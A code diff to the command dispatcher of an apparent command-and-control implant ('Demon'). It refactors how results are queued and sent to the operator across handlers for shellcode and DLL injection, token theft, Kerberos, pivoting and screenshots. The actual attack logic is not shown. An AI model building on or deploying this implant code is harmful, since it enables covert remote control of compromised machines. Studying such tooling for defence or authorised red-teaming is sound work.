@@ -44,7 +44,6 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
 
 VOID CommandDispatcher( VOID )
 {
-    PPACKAGE Package;
     PARSER   Parser         = { 0 };
     LPVOID   DataBuffer     = NULL;
     SIZE_T   DataBufferSize = 0;
@@ -56,13 +55,6 @@ VOID CommandDispatcher( VOID )
 
     PRINTF( "Session ID => %x\n", Instance.Session.AgentID );
 
-    /* Create our request task package */
-    Package = PackageCreate( DEMON_COMMAND_GET_JOB );
-
-    /* We don't want it to get destroyed. we kinda want to avoid alloc memory for it everytime. */
-    Package->Destroy = FALSE;
-    PackageAddInt32( Package, Instance.Session.AgentID );
-
     do
     {
         if ( ! Instance.Session.Connected )
@@ -72,7 +64,6 @@ VOID CommandDispatcher( VOID )
 
         if ( ReachedKillDate() )
         {
-            PackageDestroy( Package );
             KillDate();
         }
 
@@ -84,15 +75,17 @@ VOID CommandDispatcher( VOID )
 
 #ifdef TRANSPORT_HTTP
         /* Send our buffer. */
-        if ( ! PackageTransmit( Package, &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
+        if ( ! PackageTransmitAll( &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
         {
-            PackageDestroy( Package );
             CommandExit( NULL );
         }
 
 /* SMB */
 #else
-        // SMB agents simply try to read from their Pipe
+        // send all the packages we might have
+        PackageTransmitAll( NULL, NULL );
+
+        // read from pipe to receive new tasks
         if ( ! SMBGetJob( &DataBuffer, &DataBufferSize ) )
         {
             PUTS( "SMBGetJob failed" )
@@ -105,8 +98,8 @@ VOID CommandDispatcher( VOID )
             ParserNew( &Parser, DataBuffer, DataBufferSize );
             do
             {
-                RequestID  = ParserGetInt32( &Parser );
                 CommandID  = ParserGetInt32( &Parser );
+                RequestID  = ParserGetInt32( &Parser );
                 TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );
 
                 Instance.CurrentRequestID = RequestID;
@@ -170,8 +163,6 @@ VOID CommandDispatcher( VOID )
 
     Instance.Session.Connected = FALSE;
 
-    PackageDestroy( Package );
-
     PUTS( "Out of while loop" )
 }
 
@@ -183,7 +174,7 @@ VOID CommandCheckin( PPARSER Parser )
 
     DemonMetaData( &Package, FALSE );
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandSleep( PPARSER Parser )
@@ -197,7 +188,7 @@ VOID CommandSleep( PPARSER Parser )
 
     PackageAddInt32( Package, Instance.Config.Sleeping );
     PackageAddInt32( Package, Instance.Config.Jitter );
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandJob( PPARSER Parser )
@@ -272,7 +263,7 @@ VOID CommandJob( PPARSER Parser )
         }
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandProc( PPARSER Parser )
@@ -565,7 +556,7 @@ VOID CommandProc( PPARSER Parser )
     }
 
     // TODO: handle error
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 /*!
@@ -672,7 +663,7 @@ VOID CommandProcList(
             SysProcessInfo = C_PTR( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
         } while ( TRUE );
 
-        PackageTransmit( Package, NULL, NULL );
+        PackageTransmit( Package );
 
         /* Free our process list */
         if ( SysProcessPtr ) {
@@ -1064,7 +1055,7 @@ VOID CommandFS( PPARSER Parser )
     }
 
     PUTS( "Transmit package" )
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 
 LEAVE:
     PUTS( "PackageDestroy" )
@@ -1178,7 +1169,7 @@ VOID CommandInjectDLL( PPARSER Parser )
     PRINTF( "Injected Result: %d\n", Result )
 
     PackageAddInt32( Package, Result );
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandSpawnDLL( PPARSER Parser )
@@ -1197,7 +1188,7 @@ VOID CommandSpawnDLL( PPARSER Parser )
     Result  = DllSpawnReflective( DllLdr, DllLdrSize, DllBytes, DllSize, Arguments, ArgSize, &InjCtx );
 
     PackageAddInt32( Package, Result );
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandInjectShellcode(
@@ -1304,7 +1295,7 @@ VOID CommandInjectShellcode(
 
 
     PackageAddInt32( Package, Status );
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandToken( PPARSER Parser )
@@ -1638,7 +1629,7 @@ VOID CommandToken( PPARSER Parser )
         }
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandAssemblyInlineExecute( PPARSER Parser )
@@ -1712,7 +1703,7 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
         {
             PPACKAGE Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
             PackageAddInt32( Package, DOTNET_INFO_FAILED );
-            PackageTransmit( Package, NULL, NULL );
+            PackageTransmit( Package );
 
             DotnetClose();
         }
@@ -1789,7 +1780,7 @@ VOID CommandAssemblyListVersion( PPARSER Parser )
         pRunTimeInfo = NULL;
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandConfig( PPARSER Parser )
@@ -2008,7 +1999,7 @@ VOID CommandConfig( PPARSER Parser )
             break;
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandScreenshot( PPARSER Parser )
@@ -2032,7 +2023,7 @@ VOID CommandScreenshot( PPARSER Parser )
         PackageAddInt32( Package, FALSE );
     }
 
-    PackageTransmit( Package, NULL, 0 );
+    PackageTransmit( Package );
 }
 
 // TODO: The Net module is unstable so fix those issues to work on normal workstation and domain server
@@ -2382,7 +2373,7 @@ VOID CommandNet( PPARSER Parser )
         }
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandPivot( PPARSER Parser )
@@ -2527,7 +2518,7 @@ VOID CommandPivot( PPARSER Parser )
     }
 
     PUTS( "Pivot transport" )
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandTransfer( PPARSER Parser )
@@ -2650,7 +2641,7 @@ VOID CommandTransfer( PPARSER Parser )
                 PackageAddInt32( Package2, Command );
                 PackageAddInt32( Package2, FileID );
                 PackageAddInt32( Package2, DOWNLOAD_REASON_REMOVED );
-                PackageTransmit( Package2, NULL, NULL );
+                PackageTransmit( Package2 );
                 Package2 = NULL;
             }
 
@@ -2658,7 +2649,7 @@ VOID CommandTransfer( PPARSER Parser )
         }
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandSocket( PPARSER Parser )
@@ -2987,7 +2978,7 @@ VOID CommandSocket( PPARSER Parser )
         default: break;
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandKerberos(
@@ -3147,7 +3138,7 @@ VOID CommandKerberos(
         default: break;
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandMemFile( PPARSER Parser )
@@ -3173,7 +3164,7 @@ VOID CommandMemFile( PPARSER Parser )
     PackageAddInt32( Package, ID );
     PackageAddInt32( Package, MemFile != NULL ? TRUE : FALSE );
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 BOOL InWorkingHours( )
@@ -3221,7 +3212,8 @@ VOID KillDate( )
      * "They say time is the fire in which we burn.
      * Right now, Captain, my time is running out." */
     PPACKAGE Package = PackageCreate( DEMON_KILL_DATE );
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
+    PackageTransmitAll( NULL, NULL );
 
     CommandExit( NULL );
 }
@@ -3257,7 +3249,8 @@ VOID CommandExit( PPARSER Parser )
         ExitMethod = ParserGetInt32( Parser );
 
         PackageAddInt32( Package, ExitMethod );
-        PackageTransmit( Package, NULL, NULL );
+        PackageTransmit( Package );
+        PackageTransmitAll( NULL, NULL );
     }
 
     // kill all running jobs
